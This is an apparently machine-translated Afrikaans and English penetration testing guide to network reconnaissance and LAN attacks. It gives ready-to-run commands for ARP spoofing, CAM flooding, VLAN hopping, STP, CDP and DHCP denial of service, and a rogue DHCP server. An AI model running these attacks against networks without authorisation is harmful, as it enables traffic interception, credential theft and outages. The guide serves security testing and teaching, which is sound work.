# Pentesting Netwerk

{{#include ../../banners/hacktricks-training.md}}



## Ontdekking van hosts van buite

Dit is 'n **kort afdeling** oor hoe om **IPs wat reageer** vanaf die **Internet** te vind.\
In hierdie situasie het jy 'n **scope van IPs** (miskien selfs verskeie **ranges**) en jy wil net uitvind **watter IPs reageer**.

### ICMP

Dit is die **maklikste** en **vinnigste** manier om te ontdek of 'n host aan is of nie.\
Jy kan probeer om 'n paar **ICMP** pakkette te stuur en **antwoorde te verwag**. Die maklikste manier is om net 'n **echo request** te stuur en 'n reaksie te verwag. Jy kan dit doen met 'n eenvoudige `ping` of deur `fping` te gebruik vir **ranges**.\
Jy kan ook **nmap** gebruik om ander tipes ICMP-pakkette te stuur (dit sal filters op gewone ICMP echo request-response omseil).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Poortontdekking

Dit is baie algemeen om te vind dat alle soorte ICMP-pakkette gefiltreer word. Dan is alles wat jy kan doen om te kontroleer of 'n host op is, om te **probeer om open ports te vind**. Elke host het **65535 ports**, dus as jy 'n "groot" scope het, kan jy **nie** toets of **elke port** van elke host open is of nie — dit sal te veel tyd neem.\\
Wat jy dus nodig het, is 'n **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) en 'n lys van die **mees gebruikte ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Jy kan hierdie stap ook met `nmap` uitvoer, maar dit is stadiger en `nmap` het ietwat probleme om hosts up te identifiseer.

### HTTP Port Discovery

Dit is net 'n TCP port discovery wat nuttig is wanneer jy wil fokus op die ontdekking van HTTP services:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Jy kan ook probeer om te kyk of 'n **UDP port open** is om te besluit of jy **meer aandag** aan 'n **host** moet gee. Aangesien **UDP services** gewoonlik **nie reageer nie** met **enige data** op 'n gewone leë **UDP probe packet**, is dit moeilik om te sê of 'n port gefilter is of open. Die maklikste manier om dit te bepaal, is om 'n packet te stuur wat verband hou met die running service, en aangesien jy nie weet watter service running is nie, moet jy die mees waarskynlike probeer gebaseer op die port number:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die nmap-lyn wat vroeër voorgestel is sal die **top 1000 UDP ports** op elke host binne die **/24**-reeks toets, maar selfs dit sal **>20min** neem. As jy **die vinnigste resultate** benodig kan jy [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) gebruik: `./udp-proto-scanner.pl 199.66.11.53/24` Dit sal hierdie **UDP probes** na hul **verwagte poort** stuur (vir 'n /24-reeks neem dit slegs 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Poortontdekking
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier vind jy 'n goeie gids oor al die bekende Wifi-aanvalle op die tyd van skryf:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Ontdek hosts van binne die netwerk

As jy binne die netwerk is, is een van die eerste dinge wat jy wil doen om **ander hosts te ontdek**. Afhangend van **hoeveel geraas** jy kan/wil veroorsaak, kan verskillende aksies uitgevoer word:

### Passief

Jy kan hierdie gereedskap gebruik om passief hosts binne 'n gekonnekteerde netwerk te ontdek:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktief

Neem kennis dat die tegnieke in [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) ook **hier** toegepas kan word.\
Maar, aangesien jy in die **dieselfde netwerk** as die ander hosts is, kan jy **meer dinge** doen:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Let daarop dat die tegnieke wat in _Ontdekking van hosts van buite_ ([_**ICMP**_](#icmp)) bespreek word, ook **hier toegepas** kan word.\
Maar, aangesien jy in die **dieselfde netwerk** as die ander hosts is, kan jy **meer dinge** doen:

- As jy 'n **subnet broadcast address** met **ping** aanspreek, behoort die ping by **elke host** uit te kom en hulle kan **aan jou reageer**: `ping -b 10.10.5.255`
- Deur die **network broadcast address** te ping, kan jy selfs hosts binne **ander subnets** vind: `ping -b 255.255.255.255`
- Gebruik die `-PE`, `-PP`, `-PM` vlae van `nmap` om host-ontdekking uit te voer deur onderskeidelik **ICMPv4 echo**, **timestamp**, en **subnet mask requests** te stuur: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan word gebruik om rekenaars **aan te skakel** deur 'n **network message**. Die magic packet wat gebruik word om die rekenaar aan te skakel is net 'n pakket waarin 'n **MAC Dst** verskaf word en wat daarna **16 keer herhaal** word binne dieselfde pakket.\
Dergelike pakkette word gewoonlik in 'n **ethernet 0x0842** of in 'n **UDP packet to port 9** gestuur.\
As **geen \[MAC]** verskaf word nie, word die pakket na **broadcast ethernet** gestuur (en die broadcast MAC sal die een wees wat herhaal word).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skandering van Hosts

Sodra jy al die IPs (eksterne of interne) ontdek het wat jy in diepte wil scan, kan verskillende aksies uitgevoer word.

### TCP

- **Oop** port: _SYN --> SYN/ACK --> RST_
- **Geslote** port: _SYN --> RST/ACK_
- **Gefiltreerde** port: _SYN --> \[GEEN REAKSIE]_
- **Gefiltreerde** port: _SYN --> ICMP boodskap_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Daar is 2 opsies om 'n UDP-poort te skandeer:

- Stuur 'n **UDP packet** en kyk vir die response _**ICMP unreachable**_ as die poort **closed** is (in verskeie gevalle sal ICMP **filtered** wees, so jy sal geen inligting ontvang of die poort closed of open is nie).
- Stuur **formatted datagrams** om 'n response van 'n **service** uit te lok (bv., DNS, DHCP, TFTP, en ander, soos gelys in _nmap-payloads_). As jy 'n **response** ontvang, is die poort **open**.

**Nmap** sal **mix both** opsies gebruik met "-sV" (UDP scans is baie stadig), maar merk op dat UDP scans stadiger is as TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** is ontwerp om saam met **TCP (Transmission Control Protocol)** en **UDP (User Datagram Protocol)** gebruik te word. Die hoofdoel daarvan is om die vervoer van telefoniedata oor IP-netwerke te vergemaklik, en dit weerspieël baie van die betroubaarheidskenmerke wat in **Signaling System 7 (SS7)** gevind word. **SCTP** is ’n kernkomponent van die **SIGTRAN** protokolfamilie, wat daarop gemik is om SS7-seine oor IP-netwerke te vervoer.

Ondersteuning vir **SCTP** word deur verskeie bedryfstelsels voorsien, soos **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, en **VxWorks**, wat sy wye aanvaarding en nut in die veld van telekommunikasie en netwerke aandui.

Twee verskillende scans vir SCTP word deur nmap aangebied: _-sY_ en _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS en IPS-ontduiking


{{#ref}}
ids-evasion.md
{{#endref}}

### **Meer nmap opsies**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Interne IP-adresse openbaar maak

**Verkeerd gekonfigureerde routers, firewalls en network devices** reageer soms op netwerkprobes deur **nie-publieke bronadresse** te gebruik. **tcpdump** kan gebruik word om pakkette te identifiseer wat tydens toetse vanaf private adresse ontvang word. Konkreet, op **Kali Linux** kan pakkette op die **eth2 interface** vasgevang word, wat vanaf die public Internet toeganklik is. Dit is belangrik om op te let dat as jou opstelling agter 'n **NAT** of 'n **Firewall** is, sulke pakkette waarskynlik uitgefilter sal word.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing kan jy besonderhede van IP-reekse, subnet-groottes, MAC addresses, en gasheername leer deur vasgevangde rame en pakkette te hersien. As die netwerk verkeerd gekonfigureer is of die switching fabric onder druk verkeer, kan aanvallers sensitiewe materiaal vasvang via passiewe network sniffing.

As 'n switched Ethernet network behoorlik gekonfigureer is, sal jy slegs broadcast frames en materiaal wat vir jou MAC address bestem is, sien.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Jy kan ook capture packets vanaf 'n remote machine oor 'n SSH session met Wireshark as die GUI in realtime.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Natuurlik.

### Vaslegging van credentials

Jy kan gereedskap soos [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gebruik om credentials uit 'n pcap of 'n live interface te ontleed.

## LAN-aanvalle

### ARP spoofing

ARP Spoofing bestaan uit die stuur van gratuitous ARPResponses om aan te dui dat die IP van 'n masjien die MAC van ons toestel het. Dan sal die slagoffer die ARP-tabel verander en ons toestel kontak elke keer as dit die gespoofte IP wil kontak.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Vul die switch se CAM table deur baie pakkette te stuur met verskillende source mac address. Wanneer die CAM table vol is begin die switch soos 'n hub optree (broadcasting all the traffic).
```bash
macof -i <interface>
```
In moderne skakelaars is hierdie kwesbaarheid reggestel.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

Die Dynamic Trunking Protocol (DTP) is ontwerp as 'n link layer-protokol om 'n outomatiese stelsel vir trunking te fasiliteer, wat swakelaars toelaat om poorte outomaties te kies vir trunk-modus (Trunk) of nie-trunk-modus. Die gebruik van DTP word dikwels as 'n aanduiding van suboptimale netwerkontwerp beskou, wat beklemtoon hoe belangrik dit is om trunks slegs waar nodig handmatig te konfigureer en behoorlike dokumentasie te verseker.

By verstek is switch ports ingestel om in Dynamic Auto mode te werk, wat beteken dat hulle gereed is om trunking te begin indien dit deur 'n naburige switch aangevra word. 'n Sekuriteitskwessie ontstaan wanneer 'n pentester of aanvaller aan die switch koppel en 'n DTP Desirable frame stuur, wat die poort dwing om in trunk-modus te gaan. Hierdie aksie stel die aanvaller in staat om VLANs te enumereer deur STP frame-analise en VLAN-segmentasie te omseil deur virtual interfaces op te stel.

Die voorkoms van DTP in baie skakelaars as standaard kan deur teenstanders uitgebuit word om 'n switch se gedrag na te boots, en sodoende toegang tot verkeer oor alle VLANs te bekom. Die script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) word gebruik om 'n interface te monitor, en openbaar of 'n switch in Default, Trunk, Dynamic, Auto, of Access mode is — laasgenoemde is die enigste konfigurasie wat immuun is vir VLAN hopping attacks. Hierdie hulpmiddel evalueer die switch se kwesbaarheidsituasie.

Indien 'n netwerkkwesbaarheid geïdentifiseer word, kan die _**Yersinia**_ tool gebruik word om "enable trunking" via die DTP protocol te bedryf, wat toelaat om pakkette van alle VLANs waar te neem.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Om die VLANs te enumereer is dit ook moontlik om die DTP Desirable frame met die script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py). Moet die script onder geen omstandighede onderbreek nie. Dit inspuit DTP Desirable elke drie sekondes. **Die dinamies geskepte trunk channels op die switch bestaan slegs vir vyf minute. Na vyf minute val die trunk af.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Ek wil graag daarop wys dat **Access/Desirable (0x03)** aandui dat die DTP frame van die Desirable type is, wat die poort vertel om na Trunk mode oor te skakel. En **802.1Q/802.1Q (0xa5** dui die **802.1Q** enkapsuleringstipe aan.

Deur die STP-frames te ontleed, **vind ons uit van die bestaan van VLAN 30 en VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Aanval op spesifieke VLANs

Sodra jy VLAN-IDs en IP-waardes ken, kan jy **'n virtuele koppelvlak konfigureer om 'n spesifieke VLAN aan te val**.\
As DHCP nie beskikbaar is nie, gebruik dan _ifconfig_ om 'n statiese IP-adres te stel.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Outomatiese VLAN Hopper

Die bespreekte aanval van **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** ander VLANs word outomaties deur die tool uitgevoer: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

As 'n attacker die waarde van die **MAC, IP and VLAN ID of the victim host** ken, kan hy probeer om 'n **double tag a frame** met sy aangewese VLAN en die VLAN van die victim te plaas en 'n pakket te stuur. Aangesien die **victim sal nie terug kan koppel nie** met die attacker, is die **beste opsie vir die attacker om via UDP te kommunikeer** met protokolle wat interessante aksies kan uitvoer (soos SNMP).

Nog 'n opsie vir die attacker is om 'n **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (waarskynlik via die internet) te loods. Daarna kan die attacker in die tweede host wat hy besit sniff as dit pakkette van die victim ontvang.

![](<../../images/image (190).png>)

Om hierdie aanval uit te voer kan jy scapy gebruik: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

As jy **toegang tot 'n switch het waaraan jy direk gekoppel is**, het jy die vermoë om binne die netwerk **VLAN segmentation** te omseil. Skakel eenvoudig die poort na **trunk mode** (ook bekend as trunk), skep virtual interfaces met die IDs van die teiken VLANs, en stel 'n IP address in. Jy kan probeer die adres dinamies versoek (DHCP) of dit staties konfigureer. Dit hang van die geval af.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In sekere omgewings, soos guest wireless networks, word **port isolation (ook bekend as private VLAN)** instellings geïmplementeer om te verhoed dat kliënte wat aan 'n wireless access point gekoppel is, direk met mekaar kommunikeer. Daar is egter 'n tegniek geïdentifiseer wat hierdie isolasie-maatreëls kan omseil. Hierdie tegniek misbruik óf die afwesigheid van network ACLs óf hul wan-konfigurasie, waardeur IP packets via 'n router gerouteer kan word om 'n ander kliënt op dieselfde netwerk te bereik.

Die aanval word uitgevoer deur 'n **packet te skep wat die IP address van die bestemmingkliënt dra maar met die router se MAC address**. Dit laat die router foutiewelik die packet na die teiken-kliënt stuur. Hierdie benadering is soortgelyk aan dié wat in Double Tagging Attacks gebruik word, waar die vermoë om 'n host wat vir die slagoffer toeganklik is te beheer, gebruik word om die sekuriteitsfout uit te buit.

**Belangrike stappe van die aanval:**

1. **Crafting a Packet:** 'n Packet word spesiaal saamgestel om die teiken-kliënt se IP address in te sluit maar met die router se MAC address.
2. **Exploiting Router Behavior:** Die saamgestelde packet word na die router gestuur, wat, vanweë die konfigurasie, die packet na die teiken-kliënt herlei en sodoende die isolasie wat deur private VLAN settings verskaf word, omseil.

### VTP Attacks

VTP (VLAN Trunking Protocol) sentraliseer VLAN bestuur. Dit gebruik revision numbers om die VLAN database integriteit te handhaaf; enige wysiging verhoog hierdie nommer. Switches neem konfigurasies met hoër revision numbers aan en werk hul eie VLAN databases op.

#### VTP Domain Roles

- **VTP Server:** Beheer VLANs—skep, verwyder, wysig. Dit stuur VTP announcements aan domain members.
- **VTP Client:** Ontvang VTP announcements om sy VLAN database te sinkroniseer. Hierdie rol is beperk van plaaslike VLAN konfigurasiemodifikasies.
- **VTP Transparent:** Neem nie deel aan VTP updates nie maar stuur VTP announcements deur. Ongeaffekteer deur VTP attacks, handhaaf dit 'n konstante revision number van nul.

#### VTP Advertisement Types

- **Summary Advertisement:** Uitgesaai deur die VTP server elke 300 sekondes en dra noodsaaklike domain-inligting.
- **Subset Advertisement:** Gestuur na VLAN configuration changes.
- **Advertisement Request:** Uitgereik deur 'n VTP client om 'n Summary Advertisement te versoek, tipies in reaksie op die detectering van 'n hoër configuration revision number.

VTP kwetsbaarhede is uitsluitlik uitbuitbaar via trunk ports aangesien VTP announcements slegs daardeur sirkuleer. Na 'n DTP attack kan scenario's na VTP skuif. Tools soos Yersinia kan VTP attacks vergemaklik, met die doel om die VLAN database uit te vee en sodoende die netwerk effektief te ontwrig.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia se grafiese modus, kies die 'deleting all VTP vlans' opsie om die VLAN-databasis skoon te maak.

### STP-aanvalle

**As jy nie BPDU-frames op jou koppelvlakke kan vasvang nie, is dit onwaarskynlik dat jy in 'n STP-aanval sal slaag.**

#### **STP BPDU DoS**

Deur baie BPDUs te stuur — TCP (Topology Change Notification) of Conf (die BPDUs wat gestuur word wanneer die topologie geskep word) — raak die skakelaars oorlaai en hou op om korrek te werk.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Wanneer 'n TCP-pakket gestuur word, sal die CAM table van die switches ná 15s uitgevee word. As jy dan voortdurend hierdie tipe pakkette stuur, sal die CAM table voortdurend herbegin word (of elke 15segs) en wanneer dit herbegin, gedra die switch hom soos 'n hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Die attacker simuleer die gedrag van ’n switch om die STP root van die netwerk te word. Dan sal meer data deur hom verbygaan. Dit is interessant wanneer jy aan twee verskillende switches gekoppel is.\
Dit word gedoen deur BPDUs CONF packets te stuur wat sê dat die **priority** waarde laer is as die werklike priority van die werklike root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**As die attacker aan 2 skakelaars gekoppel is, kan hy die root van die nuwe boom wees en sal alle verkeer tussen daardie skakelaars deur hom gaan (sal 'n MITM attack uitgevoer word).**
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP-aanvalle

CISCO Discovery Protocol (CDP) is noodsaaklik vir kommunikasie tussen CISCO-toestelle, en stel hulle in staat om mekaar te **identifiseer en konfigurasie-besonderhede te deel**.

#### Passiewe dataversameling <a href="#id-0e0f" id="id-0e0f"></a>

CDP is gekonfigureer om inligting oor alle poorte uit te saai, wat 'n veiligheidsrisiko kan inhou. 'n Aanvaller wat by 'n switch‑poort aansluit, kan netwerk‑snuffelaars soos **Wireshark**, **tcpdump**, of **Yersinia** inspan. Hierdie aksie kan sensitiewe data oor die netwerktoestel openbaar, insluitend die model en die weergawe van Cisco IOS waarop dit loop. Die aanvaller kan dan spesifieke kwesbaarhede in die geïdentifiseerde Cisco IOS‑weergawe teiken.

#### Induseer CDP‑tabelvloei <a href="#id-0d6a" id="id-0d6a"></a>

'n Meer aggressiewe benadering behels die loods van 'n Denial of Service (DoS)‑aanval deur die geheue van die switch te oorlaai, terwyl dit voorskyn kom as geldige CISCO‑toestelle. Hieronder is die opdragreeks om so 'n aanval met Yersinia, 'n netwerkhulpmiddel vir toetsing, te begin:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Tydens hierdie aanval word die switch se CPU en CDP neighbor table swaar belas, wat lei tot wat dikwels **“netwerkverlamming”** genoem word as gevolg van die oormatige hulpbronverbruik.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Jy kan ook [**scapy**](https://github.com/secdev/scapy/) gebruik. Maak seker dat jy dit met die `scapy/contrib`-pakket installeer.

### VoIP-aanvalle en die VoIP Hopper Tool

VoIP-telefone, wat toenemend met IoT-toestelle geïntegreer word, bied funksies soos die ontsluit van deure of die beheer van termostate via spesiale telefoonnommers. Hierdie integrasie kan egter sekuriteitsrisiko's inhou.

Die hulpmiddel [**voiphopper**](http://voiphopper.sourceforge.net) is ontwerp om 'n VoIP-foon in verskeie omgewings (Cisco, Avaya, Nortel, Alcatel-Lucent) te emuleer. Dit ontdek die stemnetwerk se VLAN ID deur protokolle soos CDP, DHCP, LLDP-MED en 802.1Q ARP te gebruik.

**VoIP Hopper** bied drie modusse vir die Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analiseer netwerkpakkette om die VLAN ID te identifiseer.
2. **Spoof Mode** (`-c 1`): Genereer persoonlike pakkette wat dié van 'n werklike VoIP-toestel naboots.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Stuur pakkette identies aan dié van 'n spesifieke Cisco IP-foonmodel.

Die voorkeurmodus vir spoed is die derde. Dit vereis dat jy spesifiseer:

- Die aanvaller se netwerk-koppelvlak (`-i` parameter).
- Die naam van die VoIP-toestel wat nageboots word (`-E` parameter), volgens die Cisco-noemformaat (bv. SEP gevolg deur 'n MAC-adres).

In korporatiewe omgewings, om 'n bestaande VoIP-toestel na te boots, kan jy:

- Inspekteer die MAC-etiket op die telefoon.
- Gaan na die telefoon se skerminstellings om modelinligting te sien.
- Koppel die VoIP-toestel aan 'n skootrekenaar en kyk na CDP-versoeke met Wireshark.

'n Voorbeeldopdrag om die hulpmiddel in die derde modus uit te voer sou wees:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Aanvalle

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Twee tipes DoS** kan teen DHCP servers uitgevoer word. Die eerste behels **simuleer genoeg fake hosts om alle moontlike IP-adresse te gebruik**.\
Hierdie aanval sal slegs werk as jy die reaksies van die DHCP server kan sien en die protokol kan voltooi (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Byvoorbeeld, dit is **nie moontlik in Wifi networks nie**.

Nog 'n manier om 'n DHCP DoS uit te voer is om 'n **DHCP-RELEASE packet wat as source code elke moontlike IP gebruik** te stuur. Dan sal die server dink dat almal klaar is met die gebruik van die IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **kan jy kwaadwillige waardes bedien wat in die volgende aanval genoem word**.

#### Stel kwaadwillige waardes

A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. This is useful for network attacks, like capturing HTTP traffic and credentials, by redirecting traffic to a malicious server. However, setting a rogue gateway is less effective since it only allows capturing outbound traffic from the client, missing the responses from the real gateway. Instead, setting up a rogue DNS or WPAD server is recommended for a more effective attack.

Below are the command options for configuring the rogue DHCP server:

- **Ons IP-adres (Gateway Advertisement)**: Gebruik `-i 10.0.0.100` om jou masjien se IP as die gateway te adverteer.
- **Local DNS Domain Name**: Opsioneel, gebruik `-d example.org` om 'n plaaslike DNS-domein te stel.
- **Original Router/Gateway IP**: Gebruik `-r 10.0.0.1` om die IP-adres van die regmatige router of gateway te spesifiseer.
- **Primary DNS Server IP**: Gebruik `-p 10.0.0.100` om die IP-adres van die rogue DNS server wat jy beheer te stel.
- **Secondary DNS Server IP**: Opsioneel, gebruik `-s 10.0.0.1` om 'n sekondêre DNS-server IP te stel.
- **Netmask of Local Network**: Gebruik `-n 255.255.255.0` om die netmask vir die plaaslike netwerk te definieer.
- **Interface for DHCP Traffic**: Gebruik `-I eth1` om vir DHCP traffic op 'n spesifieke netwerkinterface te luister.
- **WPAD Configuration Address**: Gebruik `-w “http://10.0.0.100/wpad.dat”` om die adres vir WPAD-konfigurasie te stel, wat help met die onderskep van web traffic.
- **Spoof Default Gateway IP**: Sluit `-S` in om die standaard gateway IP-adres te spoof.
- **Respond to All DHCP Requests**: Sluit `-R` in om die server te laat reageer op alle DHCP-versoeke, maar wees bewus dat dit luidrugtig is en opgespoor kan word.

By correctly using these options, a rogue DHCP server can be established to intercept network traffic effectively.
```python
# Example to start a rogue DHCP server with specified options
